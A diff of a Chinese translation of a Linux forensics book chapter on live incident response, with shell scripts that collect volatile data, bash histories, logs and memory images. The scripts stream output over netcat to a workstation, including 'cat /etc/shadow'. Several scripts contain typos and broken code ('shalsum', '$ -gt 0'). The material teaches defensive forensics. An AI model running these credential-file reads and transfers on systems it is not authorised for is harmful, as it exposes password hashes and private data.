@@ -1118,12 +1148,11 @@ phil@it1laptop:~$ ls bash.suspect
 bash.suspect
 phil@it1laptop:~$ chmod +x bash.suspect
 phil@it1laptop:~$ /bash.suspect
-phil@it1laptop:~$ 
+phil@it1laptop:~$
 ```
 
 ### 图 2.11
-
-设置 netcat 监听器接收文件。
+设置 `netcat` 监听器接收文件。
 
 ```
 phil@laptop:~$ nc 192.168.1.119 4444 < /bin/bash
@@ -1131,12 +1160,11 @@ phil@laptop:~$ _
 ```
 
 图 2.12
-
-使用 netcat 发送文件。
+使用 `netcat` 发送文件。
 
 ### 使用脚本自动化过程
 
-显而易见，我们上面描述的这个小 netcat 系统非常适合编写脚本。人们可能会提出的第一个问题是应该使用哪种脚本语言。许多人会立即跳到使用 Python 来完成这项任务。虽然我喜欢用 Python 处理许多取证和安全任务，但在这种情况下并不是最佳选择。
+显而易见，我们上面描述的这个小 `netcat` 系统非常适合编写脚本。人们可能会提出的第一个问题是应该使用哪种脚本语言。许多人会立即跳到使用 Python 来完成这项任务。虽然我喜欢用 Python 处理许多取证和安全任务，但在这种情况下并不是最佳选择。
 
 在我看来，有几个理由说明 shell 脚本是更好的选择。首先，我们希望尽可能地减少内存占用，而执行 Python 解释器与这一目标背道而驰。其次，主要运行其他程序的 Python 脚本毫无意义。直接在 shell 脚本中执行这些程序要简单得多。对于某些读者来说，额外的好处是这里描述的脚本构成了基础 shell 脚本的很好的介绍。
 
@@ -1146,8 +1174,11 @@ phil@laptop:~$ _
 
 ```bash
 #!/bin/bash
+
 #
+
 ### start-case.sh
+
 #
 ```
 
@@ -1161,38 +1192,63 @@ phil@laptop:~$ _
 ```
 usage () {
 echo "usage: $0 <case number>"
-echo "创建案件文件夹并启动监听器的简单脚本"
-exit 1
-}
-
-if [ $# -lt 1 ]; then
-usage
-else
-echo "Starting case $1"
-fi
-### 如果目录不存在则创建它
-if [ ! -d $1 ]; then
-mkdir $1
-fi
-### 创建日志监听器
-nc -k -l 4444 >> $1/log.txt &
-echo "Started log listener for case $1 on $(date)"
-### 启动文件监听器
-./start-file-listener.sh $1 &
-
 ```
 
-此脚本以特殊注释 `#!` 开头，称为 she-bang，它会导致 bash 被执行。运行特定的 shell 是重要的，因为允许用户自行选择 shell 的可能会选择与你的脚本不兼容的内容。行中的任何位置开始都是注释，在行尾结束。前几行是描述脚本的注释。定义了一个名为 `usage` 的函数。在 shell 脚本中定义函数只需输入其名称，后跟一个空格、空括号，然后用大括号将函数中的命令括起来。与编译语言和脚本语言不同，shell 脚本需要在适当的位置留有空白，否则它们将无法正常工作。`usage: $0 <case number>` 一行中的 `$0` 是一个变量，它被设置为运行脚本时使用的第一个参数，即文件名。注意 `echo` 命令中使用了双引号。任何包含在双引号内的内容都会被 shell 扩展（解释）。如果使用单引号，则不进行扩展。当用户提供的命令行参数没有意义时，定义一个显示出来的 `usage` 函数是良好的编程习惯。`if [ $# -lt 1 ] then` 行开启了一个 `if` 块。逻辑测试包含在方括号中。注意括号周围和部分之间必须有空格。
+
+
+`echo "创建案件文件夹并启动监听器的简单脚本"`
+
+`exit 1`
+
+`}`
+
+`if [ $# -lt 1 ]; then`
+
+`usage`
+
+`else`
+
+`echo "Starting case $1"`
+
+`fi`
+
+### 如果目录不存在则创建它
+
+`if [ ! -d $1 ]; then`
+
+`mkdir $1`
+
+`fi`
+
+### 创建日志监听器
+
+`nc -k -l 4444 >> $1/log.txt &`
+
+`echo "Started log listener for case $1 on $(date)"`
+
+### 启动文件监听器
+
+`./start-file-listener.sh $1 &`
+
+```
+```
+
+此脚本以特殊注释 `#!` 开头，称为 she-bang，它会导致 `bash` 被执行。运行特定的 shell 是重要的，因为允许用户自行选择 shell 的可能会选择与你的脚本不兼容的内容。行中的任何位置开始都是注释，在行尾结束。前几行是描述脚本的注释。定义了一个名为 `usage` 的函数。在 shell 脚本中定义函数只需输入其名称，后跟一个空格、空括号，然后用大括号将函数中的命令括起来。与编译语言和脚本语言不同，shell 脚本需要在适当的位置留有空白，否则它们将无法正常工作。`usage: $0 <case number>` 一行中的 `$0` 是一个变量，它被设置为运行脚本时使用的第一个参数，即文件名。注意 `echo` 命令中使用了双引号。任何包含在双引号内的内容都会被 shell 扩展（解释）。如果使用单引号，则不进行扩展。当用户提供的命令行参数没有意义时，定义一个显示出来的 `usage` 函数是良好的编程习惯。`if [ $# -lt 1 ] then` 行开启了一个 `if` 块。逻辑测试包含在方括号中。注意括号周围和部分之间必须有空格。
 
 ### 脚本服务器
 
 ```bash
 #!/bin/bash
+
 #
+
 ### start-file-listener.sh
+
 #
+
 ### 接收文件的 netcat 监听器脚本。旨在作为
 ### 初始现场响应的一部分。
+
 ### 由 Dr. Phil Polstra (@ppolstra) 编写，专为
 ### PentesterAcademy.com。
 
@@ -1213,9 +1269,7 @@ do
 done
 ```
 
-
-
-4444，然后我们使用 `killall` 工具用来杀死我们的两个脚本和 `netcat` 的所有实例。如果你好奇为什么我们需要杀死 `netcat`，因为它是由脚本调用的，请记住在某些情况下它是在后台运行的。此外，系统上可能存在一个挂起的或正在进程中的 `netcat` 监听器或发送者。出于这些原因，最安全的方法直接杀死所有的 `netcat` 进程。
+`4444`，然后我们使用 `killall` 工具用来杀死我们的两个脚本和 `netcat` 的所有实例。如果你好奇为什么我们需要杀死 `netcat`，因为它是由脚本调用的，请记住在某些情况下它是在后台运行的。此外，系统上可能存在一个挂起的或正在进程中的 `netcat` 监听器或发送者。出于这些原因，最安全的方法直接杀死所有的 `netcat` 进程。
 
 ### 编写客户端脚本
 
@@ -1223,12 +1277,13 @@ done
 
 ```bash
 ### setup-client.sh
-
 ### 简单的脚本，用于为受调查系统
 ### 设置环境变量。旨在作为
 ### 现场响应的一部分使用。
+
 ### 由 Phil Polstra 博士 (@ppolstra) 编写，
 ### 为 PentesterAcademy.com 开发。
+
 usage () {
   echo "source $0 <forensics workstation IP> [log port] [file transfer port]"
   echo "设置与取证工作站通信变量的简单脚本"
@@ -1241,6 +1296,7 @@ if [ $# -lt 1 ]; then
 fi
 
 export RHOST=$1
+
 if [ $# -gt 1 ]; then
   export RPORT=$2
 else
@@ -1268,15 +1324,17 @@ fi
 
 ```bash
 ### send-log.sh
-
 ### 简单的脚本，将新的日志条目
 ### 发送到取证工作站的监听器。旨在作为
 ### 现场响应的一部分使用。
+
 ### 由 Phil Polstra 博士 (@ppolstra) 编写，
 ### 为 PentesterAcademy.com 开发。
+
 ### 主要用于测试的默认值
 ### -z "$RHOST" && { export RHOST=localhost; }
 ### -z "$RPORT" && { export RPORT=4444; }
+
 usage() {
   echo "usage: $0 <command or script>"
   echo "向监听器发送日志条目的简单脚本"
@@ -1291,18 +1349,17 @@ else
 fi
 ```
 
+
+
 脚本开头有几行，如果尚未设置，它们将设置 `RHOST` 和 `PORT` 的默认值。这些行演示了如何将你的 shell 脚本作为快捷方式使用的一种强大技术。`[ -z "$RHOST"] && { export RHOST=localhost; }` 这一行由由 `AND` 运算符分隔的两个语句组成。前半部分测试 `RHOST` 环境变量以检查它是否为空（空或未设置）。注意带有前缀 `$` 的变量被包含在双引号中。这强制 shell 将此值解释为字符串，以便测试按预期工作。如果语句没有结果为真，则没有理由费会该行的后半部分，因此它被跳过（短路逻辑）。大括号用于显式地将语句中的所有内容分组。
 
 # 不仅用于脚本
 
-### 短路逻辑在很多地方很有用
+## 短路逻辑在很多地方很有用
 
 短路逻辑不仅用于脚本。当你有一系列可能运行较长时间的命令，且每个命令都依赖于前一个命令的成功执行时，它会非常有用。例如，命令 `sudo apt-get update && sudo apt-get -y upgrade` 将首先更新本地软件库缓存，然后升级任何具有新版本的软件包。`-y` 选项会自动对任何提示回答“是”。如果你由于某些原因无法连接到存储库，升级命令将永远不会执行。
 
 该技术的另一个常见用途是构建软件，而你又不想坐在那里等待每个阶段是否成功完成。许多软件包需要运行一个 `configure` 脚本来检查依赖关系，并可选地设置某些非默认选项（如库和工具的位置），然后执行 `make` 和 `sudo install`。所有三个阶段的完成可能需要一些时间。
-
-
-
 
 ### 图 2.13
 
@@ -1347,9 +1404,9 @@ def get_volatile_data():
 
 从受控系统中可以收集到大量的易失性数据。收集这些数据将帮助你初步判断是否发生了事件。下面将讨论你应该收集的一些常见数据。
 
-### 日期和时间信息
+## 日期和时间信息
 
-### 操作系统版本
+## 操作系统版本
 
 如果你以后决定进行内存分析，你将需要知道运行的确切操作系统和内核版本。`uname -a` 命令将为你提供这些信息，以及机器名称和内核构建时间戳。在 PFE 受控系统上运行该命令的结果见图 2.18。
 
@@ -1359,7 +1416,7 @@ def get_volatile_data():
 
 在受控系统上运行 `uname` 的结果。
 
-### 网络接口
+## 网络接口
 
 机器上有哪些网络接口？是否有任何不该出现的新接口？这听起来可能像个奇怪的问题，但具有物理访问权限的攻击者可以很容易地添加无线接口或 USB 接口。可能存在其他奇怪但不太常见的接口。
 
@@ -1371,11 +1428,11 @@ def get_volatile_data():
 
 `ifconfig -a` 命令的执行。
 
-### 网络连接
+## 网络连接
 
 还有哪些机器正在与受控机器通信？是否存在任何可疑的本地网络连接？当系统不应具有此类访问权限时，它是否正在连接到互联网内容？这些问题以及更多问题可以通过运行 `netstat -inp` 命令回答。选项 `a`、`n` 和 `p` 分用于指定所有套字、仅使用数字 IP（不解析主机名）以及显示进程标识和程序。
 
-### 开放端口
+## 开放端口
 
 是否存在可疑的开放端口？系统是否正在连接到已知被恶意软件使用的机器端口？这些问题也可以通过运行 `netstat -anp` 命令轻松回答。在受控系统上运行该命令的结果见图 2.20。
 
@@ -1395,7 +1452,7 @@ def get_volatile_data():
 
 某些端口已知是恶意服务的所在地。即使是安全的端口也可以被其他进程使用。`netstat -anp` 的输出可用于检测使用它们不应使用的端口的程序。例如，恶意软件可以使用 80 端口，因为在普通观察者看来这像是网络流量。
 
-### 开放文件
+## 开放文件
 
 除了询问哪些程序在使用端口外，查看哪些程序正在打开某些文件也很有启发性。`lsof -V`（带详细搜索列出打开的文件）命令提供了此类信息。在受控系统上运行该命令的结果见图 2.22。与`netstat`一样，如果存在 rootkit，该命令可能会失败。
 
@@ -1405,7 +1462,7 @@ def get_volatile_data():
 
 在受控系统上运行 `lsof -V` 的结果。
 
-### 运行中的程序
+## 运行中的程序
 
 是否有可疑的运行程序？是否有不该运行的 root shell？这些问题以及更多问题可以通过运行 `ps -ef` 命令回答。如果存在 rootkit，该命令可能会无法提供完整列表。在受控系统上运行该命令的部分结果见图 2.23。
 
@@ -1415,7 +1472,7 @@ def get_volatile_data():
 
 在受控系统上运行 `ps -ef` 的结果。
 
-### 路由表
+## 路由表
 
 流量是否被重定向通过受控制的接口？网关是否被更改？这些以及其他问题可以通过检查路由表回答。获取此信息的方法有很多，两种是使用 `netstat -rn` 和 `route` 命令。rootkit 可能会通过修改这两个命令之一的结果来隐藏其存在。如果两个工具的结果不一致，则说明可能被入侵。在受控系统上运行这两个命令的结果见图 2.24。
 
@@ -1428,6 +1485,8 @@ U      10.0.2.2        10.0.2.1         0  U     0      0      0      0 eth0
 U      127.0.0.1        0.0.0.0         0  U     0      0      0      0 lo
 U      192.168.1.0    192.168.1.1         0  U     0      0      0      0
 ```
+
+
 
 图 2.24
 
@@ -1450,9 +1509,6 @@ U      192.168.1.0    192.168.1.1         0  U     0      0      0      0
 ![](img/7abfab28a493757db3f096946a95ec01_71_0.png)
 
 ![](img/7abfab28a493757db3f096946a95ec01_71_1.png)
-
-
-
 
 图 2.26
 
@@ -1496,49 +1552,79 @@ U      192.168.1.0    192.168.1.1         0  U     0      0      0      0
 
 ### 结合脚本进行
 
-没有正理由手动记住上述所有命令。由于你已经挂载了一个带有已知良好二进制文件的驱动器，那么在你的响应驱动器上有一个脚本为你完成所有工作是有意义的。以下是一个用于初始扫描的简单脚本。该脚本非常直接，主要由调用本章之前介绍的 `send-log.sh`组成。
+没有正理由手动记住上述所有命令。由于你已经挂载了一个带有已知良好二进制文件的驱动器，那么在你的响应驱动器上有一个脚本为你完成所有工作是有意义的。以下是一个用于初始扫描的简单脚本。该脚本非常直接，主要由调用本章之前介绍的 `send-log.sh` 组成。
 
 ```
 ### initial-scan.sh
 
 # 简单脚本，用于收集初始现场应急
+
 ### 基础信息。
+
 ### 由 Phil Polstra 博士 (@ppolstra) 开发，
+
 ### PentesterAcademy.com。
+
 usage () {
+
   echo "usage: $0 [listening host]"
+
   echo "向监听器发送日志条目的简单脚本"
+
   exit 1
+
 }
 ```
 
 ```bash
 # 你是否指定了监听器 IP?
+
 if [ $# -gt 1 ] || [ "$1" == "--help" ]; then
+
   usage
+
 fi
 
 # 你是否指定了监听器 IP?
+
 if [ "$1" != "" ]; then
+
   source setup-client.sh
+
 fi
 
 # 现在收集一些信息！
+
 send-log.sh date
+
 send-log.sh uname -a
+
 send-log.sh ifconfig -a
+
 send-log.sh netstat -an
+
 send-log.sh lsof -V
+
 send-log.sh ps -ef
+
 send-log.sh netstat -rn
+
 send-log.sh route
+
 send-log.sh lsmod
+
 send-log.sh df
+
 send-log.sh mount
+
 send-log.sh w
+
 send-log.sh last
+
 send-log.sh lastb
+
 send-log.sh cat /etc/passwd
+
 send-log.sh cat /etc/shadow
 ```
 
@@ -1576,36 +1662,63 @@ send-log.sh cat /etc/shadow
 ### initial-scan.sh
 
 # 简单脚本，用于收集初始现场应急
+
 ### 基础信息。
+
 ### 由 Phil Polstra 博士 (@ppolstra) 开发，
+
 ### PentesterAcademy.com。
+
 usage () {
+
   echo "usage: $0 [listening host]"
+
   echo "向监听器发送日志条目的简单脚本"
+
   exit 1
+
 }
 ```
 
 ```bash
 # 你是否指定了监听器 IP?
+
 if [ $# -gt 1 ] || [ "$1" == "--help" ]; then
+
   usage
+
 fi
 
 # 你是否指定了监听器 IP?
+
 if [ "$1" != "" ]; then
+
   source setup-client.sh
+
 fi
 
 # 现在收集一些信息！
+
 send-log.sh date
+
 send-log.sh uname -a
+
 send-log.sh ifconfig -a
+
 send-log.sh netstat -an
+
 send-log.sh lsof -V
+
 send-log.sh ps -ef
+
 send-log.sh netstat -rn
+
 send-log.sh route
+```
+
+
+
+```bash
 send-log.sh lsmod
 send-log.sh df
 send-log.sh mount
@@ -1641,16 +1754,6 @@ send-log.sh cat /etc/shadow
 目标系统的 `/etc/passwd` 文件的部分列表。高亮行是一个新的 `johnn` 账户，从第一行看与 `john` 相同。注意其隐藏的家目录。
 
 查看图 2.30 中 `lightdm` 账户的行，我们观察到 shell 应该设置为 `/bin/false`。这是用于禁用某些系统账户的常用技术。从 `last` 命令的结果可以看出，该用户能够登录。这是调查 `/bin/false` 二进制文件的原因。
-[/content]
-
-*(注：由于提供的待翻译文本存在大量重复，我已根据您的“不要重复输出原文”指令，对翻译内容进行了去重处理，确保所有不同逻辑块均已翻译且不重复。)*
-
-**抱歉，重新审视后，我发现提供的输入文本包含了完全重复段落。以下是去重后的完整翻译版本：**
-
-[content]
-图 2.26
-
-在目标系统上运行 Ismod 的部分结果。
 
 ## 过去与现在的用户
 
@@ -1662,7 +1765,7 @@ send-log.sh cat /etc/shadow
 
 在目标系统上运行 `w` 命令的结果。
 
-最近有谁登录过？这个问题由 `last` 命令回答。可以使用 `lastb` 命令获取失败登录尝试的列表。`last` 命令列出了用户登录的时间、如果系统在用户登录期间发生崩溃或关机的时间，以及系统启动的时间。由于运行 `last` 的部分结果如图 2.28 所示。请注意， 3 月 9 日存在多个可疑登录记录。一个不该存在的新用户 `johnn` 登录了，系统账户 `lightdm` 也是如此。
+最近有谁登录过？这个问题由 `last` 命令回答。可以使用 `lastb` 命令获取失败登录尝试的列表。`last` 命令列出了用户登录的时间、如果系统在用户登录期间发生崩溃或关机的时间，以及系统启动的时间。由于运行 `last` 的部分结果如图 2.28 所示。请注意，3 月 9 日存在多个可疑登录记录。一个不该存在的新用户 `johnn` 登录了，系统账户 `lightdm` 也是如此。
 
 ![](img/7abfab28a493757db3f096946a95ec01_73_0.png)
 
@@ -1696,28 +1799,43 @@ send-log.sh cat /etc/shadow
 ### initial-scan.sh
 
 # 简单脚本，用于收集初始现场应急
+
 ### 基础信息。
+
 ### 由 Phil Polstra 博士 (@ppolstra) 开发，
+
 ### PentesterAcademy.com。
+
 usage () {
+
   echo "usage: $0 [listening host]"
+
   echo "向监听器发送日志条目的简单脚本"
+
   exit 1
+
 }
 ```
 
 ```bash
 # 你是否指定了监听器 IP?
+
 if [ $# -gt 1 ] || [ "$1" == "--help" ]; then
+
   usage
+
 fi
 
 # 你是否指定了监听器 IP?
+
 if [ "$1" != "" ]; then
+
   source setup-client.sh
+
 fi
 
 # 现在收集一些信息！
+
 send-log.sh date
 send-log.sh uname -a
 send-log.sh ifconfig -a
@@ -1735,6 +1853,8 @@ send-log.sh lastb
 send-log.sh cat /etc/passwd
 send-log.sh cat /etc/shadow
 ```
+
+
 
 ### 总结
 
@@ -1755,8 +1875,6 @@ send-log.sh cat /etc/shadow
 
 本章中的信息：
 是否有攻击者创建的新账户？是否有人修改了账户以允许系统账户登录？是否因为用户使用了不安全的密码导致系统被入侵？检查 `/etc/passwd` 和 `/etc/shadow` 文件可以帮助你回答这些问题。
-
-
 
 根据上一节脚本的输出，可以根据修改时间、创建时间和访问时间进行排序，这将非常有帮助。虽然它不是一个将这些时间戳交织在一起的正的时间轴，但可以在几分钟内创建出来。
 
@@ -1785,20 +1903,31 @@ send-log.sh cat /etc/shadow
 
 ### 检查用户命令历史
 
-bash（Bourne Again Shell）是 Linux 用户最流行的选项。它通常是默认 shell。Bash 将用户的命令历史存储在主目录下的 `.bash_history` 文件中。以下脚本使用 `find` 工具在主目录（包括 root 的主目录 `/root`）中搜索这些文件。老练的攻击者会删除这些文件和或将它们的最大大小设置为零。对于调查人员来说，幸运的是，并不是所有攻击者都知道这样做。
+`bash`（Bourne Again Shell）是 Linux 用户最流行的选项。它通常是默认 shell。`Bash` 将用户的命令历史存储在主目录下的 `.bash_history` 文件中。以下脚本使用 `find` 工具在主目录（包括 root 的主目录 `/root`）中搜索这些文件。老练的攻击者会删除这些文件和或将它们的最大大小设置为零。对于调查人员来说，幸运的是，并不是所有攻击者都知道这样做。
 
 ```
 ### send-history.sh
+
 #
+
 # 简单脚本，将所有用户 bash 历史文件作为
+
 # 初始现场响应的一部分发送
+
 ### 由 Phil Polstra 博士 (@ppolstra) 编写，
+
 # 用于 PentesterAcademy.com.
+
 usage () {
+
 echo "usage: $0"
+
 echo "简单脚本将用户历史文件发送到日志监听器"
+
 exit 1
+
 }
+
 if [ $ -gt 0 ]; then
 ```
 
@@ -1828,37 +1957,51 @@ if [ $ -gt 0 ]; then
 
 ```
 ### send-logfiles.sh
+
 # 简单脚本，将所有日志作为
+
 # 初始现场响应的一部分发送。
+
 # 警告：此脚本可能运行良好！
+
 # 由 Phil Polstra 博士 (@ppolska) 编写，
+
 # 用于 PentesterAcademy.com.
 
 usage() {
+
   echo "usage: $0"
+
   echo "简单脚本将日志文件发送到日志监听器"
+
   exit 1
+
 }
 
 if [ $ -gt 0 ]; then
+
   usage
+
 fi
 
 # 仅查找文件，排除带有数字的文件因为它们是旧日志
+
 send-log.sh find /var/log -type f -regextype posix-extended \
+```
+
+
+
+```
 -regex "/var/log/[a-zA-Z.]+([a-zA-Z.]+*" \
 -exec echo "-dumping logfile {} -n" \; \
 -exec cat {} \; -exec echo "-end of dump for logfile {} -n" \;
 ```
 
-
-
-
 此脚本与之前的获取历史脚本使用了相同的元素，但有一个例外。正则表达式中包含了一些新内容。我们使用括号将内容分组，以便应用 `*` 标识符（零或多次）。如果将正则表达式分成三个部分，会更容易理解。
 
 第一部分 `/var/log/` 匹配字面字符串，即日志文件所在的普通目录。第二部分 `[a-zA-Z]+` 匹配一个或多个字母或点。这将匹配任何当前的日志文件或目录，排除归档日志（归档日志未包含在方括号内）。最后部分 `/[a-zA-Z.]+` 与第二部分相同，但它被包裹在括号中，并在后面紧跟一个 `*`。这种分组允许 `*` 标识符（零或多次）应用于括括号内的所有内容。零次情况匹配位于 `/var/log` 中的日志，一次情况匹配子目录中的下一层级。
 
-图 3.7 显示了我们系统的部分日志文件。在图片的上部，你可以看到 dmesg（设备消息）日志的尾部。注意，该日志没有使用时间戳，它是自启动以来的计数。syslog（系统日志）的开头在图片的下部。我们可以看到 syslog 使用了时间戳。还有其他日志完全不提供时间信息。与 bash 历史类似，此类日志仅提供执行的顺序。
+图 3.7 显示了我们系统的部分日志文件。在图片的上部，你可以看到 `dmesg`（设备消息）日志的尾部。注意，该日志没有使用时间戳，它是自启动以来的计数。`syslog`（系统日志）的开头在图片的下部。我们可以看到 `syslog` 使用了时间戳。还有其他日志完全不提供时间信息。与 `bash` 历史类似，此类日志仅提供执行的顺序。
 
 ![](img/7abfab28a493757db3f096946a95ec01_88_0.png)
 
@@ -1870,27 +2013,45 @@ send-log.sh find /var/log -type f -regextype posix-extended \
 
 互联网上有许多哈希数据库，包含了已知良好文件和已知恶意文件的哈希值。这是寻找恶意软件的最佳方法吗？绝对不是！尽管如此，与使用防病毒软件分析文件或尝试对其逆向工程相比，检查哈希值要快得多。一个良好的哈希数据库可以让你从考虑范围中排除大量文件。然而，通过消除分析中的已知良好文件来减少必须查看的文件数量，要有用得多。
 
-两个流行的免费哈希数据库包括由 Web 应用安全项目 (OWASP) 提供的 https://www.owasp.org/index.php/OWASP_File_Hash_Repository，以及来自美国标准与技术研究院 (NIST) 的 http://www.nsrl.nist.gov/。截至本文写作时，它们都支持 MD5 和 SHA-1。在下面的脚本中，它们应该支持更现代的算法：
+两个流行的免费哈希数据库包括由 Web 应用安全项目（OWASP）提供的 https://www.owasp.org/index.php/OWASP_File_Hash_Repository，以及来自美国标准与技术研究院（NIST）的 http://www.nsrl.nist.gov/。截至本文写作时，它们都支持 `MD5` 和 `SHA-1`。在下面的脚本中，它们应该支持更现代的算法：
 
 ```
 ### send-shalsum.sh
+
 # 用于初始现场事件响应中
+
 # 计算 sha sum 的简单脚本。
+
 # 警告：此脚本运行可能需要很长时间！
+
 # 由 Phil Polstra 博士 (@polstra) 开发，
+
 # 为 PentesterAcademy.com 设计。
+
 usage () {
+
   echo "usage: $0 <starting directory>"
+
   echo "向日志监听器发送 SHA1 哈希传输的简单脚本"
+
   exit 1
+
 }
+
 if [ $# -lt 1 ]; then
+
   usage
+
 fi
+
 # 仅查找文件，不进入其他文件系统
+
 # 对所有找到的文件执行命令 shalsum -b <filename>
+
 find $1 -xdev -type f -exec shalsum -b {} \;
 ```
+
+
 
 一旦我们在此处使用新脚本，就出现了一个新选项 `-xdev`。此选项告诉 `-b` 不要跟随指向其他文件系统的符号链接。命令 `shalsum -b {filename}` 在计算文件名的 SHA1 哈希时，会将其视为二进制文件。
 
@@ -1916,7 +2077,7 @@ find $1 -xdev -type f -exec shalsum -b {} \;
 
 除了上述两种选择外，如果你想捕获内存，你需要创建一个可以访问所有虚拟内存的设备。顺便说，这假设你的设备运行在虚拟机内部。这里介绍的技术适用于物理和虚拟系统。
 
-取证内存设备 fmem 可以从 http://hysteria.sk/~nickt/fmem_current.tgz 下载。由于 fmem 设备（以及后将讨论的 LIME 设备）高度依赖于各种内核结构，它必须从源码构建。记住关于在目标系统上构建的早期警告。一旦构建完成，新的 /dev/fmem 就像 `/dev/mem`，但没有访问前 896 MB 的限制。可以使用 /dev/fmem 导出物理 RAM。使用 fmem 你将获得原始内存镜像。用于构建和安装 fmem 的终端截图如图 3.9 所示。注意 fmem 足够简单，整个构建和安装显示在一个屏幕上。
+取证内存设备 fmem 可以从 http://hysteria.sk/~nickt/fmem_current.tgz 下载。由于 fmem 设备（以及后将讨论的 LIME 设备）高度依赖于各种内核结构，它必须从源码构建。记住关于在目标系统上构建的早期警告。一旦构建完成，新的 `/dev/fmem` 就像 `/dev/mem`，但没有访问前 896 MB 的限制。可以使用 `/dev/fmem` 导出物理 RAM。使用 fmem 你将获得原始内存镜像。用于构建和安装 fmem 的终端截图如图 3.9 所示。注意 fmem 足够简单，整个构建和安装显示在一个屏幕上。
 
 ![](img/7abfab28a493757db3f096946a95ec01_91_0.png)
 
@@ -1928,50 +2089,49 @@ find $1 -xdev -type f -exec shalsum -b {} \;
 
 ### 图 3.10
 
-cat /proc/iomem 文件的结果。未过滤的结果显示在顶部，系统内存显示在底部。
+`cat /proc/iomem` 文件的结果。未过滤的结果显示在顶部，系统内存显示在底部。
 
 ## 构建 LiME
 
-Linux 内存提取器 (LiME) 是 Linux 系统提取内存的首选工具，原因有两个。首先，它非常易用，更重要的是，它将捕获内容存储在 Volatility 内存分析框架可以读取的格式中。LiME 必须从源码构建。LiME 应该为目标系统的精确内核版本构建，但绝不要在目标系统上构建。如果你的取证工作站恰好是目标系统使用的相同的 Ubuntu 版本，命令 `sudo apt-get install lime-forensics-dkms` 将为你下载并构建 LiME。
+Linux 内存提取器 `LiME` 是 Linux 系统提取内存的首选工具，原因有两个。首先，它非常易用，更重要的是，它将捕获内容存储在 Volatility 内存分析框架可以读取的格式中。`LiME` 必须从源码构建。`LiME` 应该为目标系统的精确内核版本构建，但绝不要在目标系统上构建。如果你的取证工作站恰好是目标系统使用的相同的 Ubuntu 版本，命令 `sudo apt-get install lime-forensics-dkms` 将为你下载并构建 `LiME`。
 
-
-对于其他任何情况，你必须从 https://github.com/504ensicsLabs/Lime 下载 LiME，使用命令 `git clone https://github.com/504ensicsLabs/Lime` 并使用正确的内核头文件对其进行编译。如果你的工作站和目标系统的内核完全一致，只需切换到 LiME 所在的目录并运行不带参数的 `make` 即可构建 LiME。下载并为当前内核构建 LiME 的完整命令集如图 3.11 所示。注意，即使我误操作了命令（在切换到 `src` 目录之前运行了 `make`），所有内容也能显示在一个屏幕内。此外，注意最后一行将 `lime.ko` 文件重命名为 `file-<kernel version>.ko`。
+对于其他任何情况，你必须从 https://github.com/504ensicsLabs/Lime 下载 `LiME`，使用命令 `git clone https://github.com/504ensicsLabs/Lime` 并使用正确的内核头文件对其进行编译。如果你的工作站和目标系统的内核完全一致，只需切换到 `LiME` 所在的目录并运行不带参数的 `make` 即可构建 `LiME`。下载并为当前内核构建 `LiME` 的完整命令集如图 3.11 所示。注意，即使我误操作了命令（在切换到 `src` 目录之前运行了 `make`），所有内容也能显示在一个屏幕内。此外，注意最后一行将 `lime.ko` 文件重命名为 `file-<kernel version>.ko`。
 
 ![](img/7abfab28a493757db3f096946a95ec01_93_0.png)
 
 图 3.11
-为当前内核下载并构建 LiME。注意在使用此方法时，模块会自动会自动命名为 `lime-<kernel version>.ko`。
+为当前内核下载并构建 `LiME`。注意在使用此方法时，模块会自动会自动命名为 `lime-<kernel version>.ko`。
 
-如果内核版本不同，为目标系统构建 LiME 的正确命令是 `make -C /lib/modules/<kernel version>/build M=$PWD`。注意，当你以这种方式构建 LiME 模块时，输出文件不会带有精确内核版本的后缀重命名。我强烈建议你自己执行操作，因为在你的响应驱动器上收集一组 LiME 内核模块并不会花费长时间。构建和重命名并非为当前内核构建的 LiME 模块的命令如图 3.12 所示。
+如果内核版本不同，为目标系统构建 `LiME` 的正确命令是 `make -C /lib/modules/<kernel version>/build M=$PWD`。注意，当你以这种方式构建 `LiME` 模块时，输出文件不会带有精确内核版本的后缀重命名。我强烈建议你自己执行操作，因为在你的响应驱动器上收集一组 `LiME` 内核模块并不会花费长时间。构建和重命名并非为当前内核构建的 `LiME` 模块的命令如图 3.12 所示。
 
 图 3.12
-为非当前内核构建 LiME。建议在创建 `lime.ko` 文件后将其重命名为更具描述性的名称。
+为非当前内核构建 `LiME`。建议在创建 `lime.ko` 文件后将其重命名为更具描述性的名称。
 
 ## 使用 LiME 转储 RAM
 
-假设你已经为目标系统正在使用的内核版本构建了 LiME，现在你已经准备好可以使用了。在使用 LiME 之前，你必须做两个选择：第一个选择是输出格式，第二个选择是转储文件的目的地（LiME 将其称为路径）。
+假设你已经为目标系统正在使用的内核版本构建了 `LiME`，现在你已经准备好可以使用了。在使用 `LiME` 之前，你必须做两个选择：第一个选择是输出格式，第二个选择是转储文件的目的地（`LiME` 将其称为路径）。
 
-有三种格式：raw（原始）、padded（填充）和 LiME。raw 格式是所有内存段的拼接。当使用 raw 格式时，包含零块的内存区域会被跳过。padded 与 raw 类似，但会保留零，这样你就可以内存块的位置，而不仅仅是其内容。
+有三种格式：`raw`（原始）、`padded`（填充）和 `LiME`。`raw` 格式是所有内存段的拼接。当使用 `raw` 格式时，包含零块的内存区域会被跳过。`padded` 与 `raw` 类似，但会保留零，这样你就可以内存块的位置，而不仅仅是其内容。
 
-意所当然，LiME 格式是推荐的格式。这种格式捕获内存并存储在带有元数据的结构中。这是 Volatility 内存分析框架的作者推荐的格式。我也推荐这种格式，因为它为你稍后的分析包含了最多的信息。
+意所当然，`LiME` 格式是推荐的格式。这种格式捕获内存并存储在带有元数据的结构中。这是 Volatility 内存分析框架的作者推荐的格式。我也推荐这种格式，因为它为你稍后的分析包含了最多的信息。
 
-LiME 支持两种不同的路径：文件或网络端口。如果你为目标计算机连接了大容量 USB 驱动器，直接将 RAM 转储存储到该文件中是可以接受的。在任何情况下都不应将此文件保存到目标系统的硬盘上！网络端口路径是我提取内存镜像的首选方法。使用此技术时，会在目标系统上设置监听器，并在取证工作站上使用 `netcat` 接收内存转储。
+`LiME` 支持两种不同的路径：文件或网络端口。如果你为目标计算机连接了大容量 USB 驱动器，直接将 RAM 转储存储到该文件中是可以接受的。在任何情况下都不应将此文件保存到目标系统的硬盘上！网络端口路径是我提取内存镜像的首选方法。使用此技术时，会在目标系统上设置监听器，并在取证工作站上使用 `netcat` 接收内存转储。
 
-运行 lime 的通用格式为 `sudo insmod lime.ko "path=<path> format=<format>`。此命令安装（或插入）内核模块。由于明显的原因，此命令需要 root 权限。注意我给 LIME 的参数加了引号。这是你在大多数 Linux 版本中需要的操作。如果这对你无效，请尝试去掉引号。
